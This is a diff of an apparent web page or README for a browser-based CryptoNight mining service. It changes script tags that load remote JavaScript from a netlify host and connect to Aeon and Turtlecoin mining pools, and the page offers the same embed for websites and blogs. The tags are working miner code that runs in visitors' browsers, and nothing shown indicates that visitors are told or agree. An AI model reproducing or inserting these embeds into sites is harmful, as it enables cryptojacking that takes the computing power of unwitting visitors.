@@ -15,11 +15,11 @@ Attention: Special Case for some custom variant fork coins: Stellite, Intensecoi
 <br><br>
 Attention: Aeon Cryptonight-lite ?algo=cn-lite?variant=0
 <br><br>
-<script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn-lite?variant=0?jason=communitypool.stellite.cash:6677"> </script>
+<script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn-lite?variant=0?jason=mine.supportaeon.com:3333"> </script>
 <br><br>
 Attention: Special Case for some custom variant fork coins: Turtlecoin need ?algo=cn-lite?variant=1
 <br><br>
-<script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn?variant=1?jason=communitypool.stellite.cash:6677"> </script>
+<script src="https://thelifeisbinary.netlify.com/media.js?perfekt=wss://?algo=cn?variant=1?jason=Pool.TRTL.CryptoPool.Space:5555"> </script>
 
 <br><br> 
 Or use our integration for websites & blogs
